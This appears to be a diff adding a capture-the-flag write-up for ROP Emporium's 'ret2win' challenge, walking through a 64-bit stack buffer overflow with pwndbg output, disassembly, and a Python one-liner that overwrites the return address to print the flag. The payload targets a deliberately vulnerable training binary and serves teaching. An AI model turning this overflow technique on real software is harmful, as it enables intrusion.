@@ -1,0 +1,79 @@
+"ret2win" is the first challenge at ropemporium. For this write-up, we will use gdb
+with pwndbg extension.
+
+If we execute the program, we'll see a message asking for a input:
+
+=====================================================================================================
+ret2win by ROP Emporium
+64bits
+
+For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
+What could possibly go wrong?
+You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
+=====================================================================================================
+ 
+
+If we give a long input, the result is Segmentation fault, which is a indication of
+buffer overflow. After using tools or making patterns by hand, we see that we can
+reach RIP with 40 bytes and overwrite completely with 48 bytes. Okay, so we can control the execution.
+
+
+Let's check some interesting functions:
+
+=====================================
+pwndbg> info func
+
+...
+0x0000000000400746  main
+0x00000000004007b5  pwnme
+0x0000000000400811  ret2win
+....
+=====================================
+
+Disassembling the functions, we can conclude that pwnme is the vulnerable function and
+main calls it. Looking a bit deeply at ret2win, we can see that it has a call to system@plt
+(which is a good signal):
+
+===============================================
+pwndbg> disassemble ret2win 
+Dump of assembler code for function ret2win:
+   0x0000000000400811 <+0>:	push   rbp
+   0x0000000000400812 <+1>:	mov    rbp,rsp
+   0x0000000000400815 <+4>:	mov    edi,0x4009e0
+   0x000000000040081a <+9>:	mov    eax,0x0
+   0x000000000040081f <+14>:	call   0x4005f0 <printf@plt>
+   0x0000000000400824 <+19>:	mov    edi,0x4009fd
+   0x0000000000400829 <+24>:	call   0x4005e0 <system@plt>
+   0x000000000040082e <+29>:	nop
+   0x000000000040082f <+30>:	pop    rbp
+   0x0000000000400830 <+31>:	ret    
+End of assembler dump.
+=================================================
+
+If we look at the adress 0x4009fd, we can see the command that'll be executed by the function system:
+
+=================================================
+pwndbg> x/s 0x4009fd
+0x4009fd:	"/bin/cat flag.txt"
+==================================================
+
+Wow, that function will execute cat with flag.txt as a parameter, a convenient way to print the flag!
+All we have to do is redirect the execution flow to the address 0x400811 (ret2win function).
+We already have the quantity of bytes to reach RIP, so if we set 40 bytes of anything + address of function
+we got the redirection. Simple, isn't it?
+
+======================================================================================================
+┌─[darkcrow@parrot]─[~/ret2win]
+└──╼ $python -c "print 'A' * 40 + '\x11\x08\x40\x00\x00\x00\x00\x00'" | ./ret2win 
+ret2win by ROP Emporium
+64bits
+
+For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
+What could possibly go wrong?
+You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
+
+> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!} <<< HERE IS OUR FLAG!
+Segmentation fault
+=======================================================================================================
+
+(Check the file "exp.py" for the PoC)
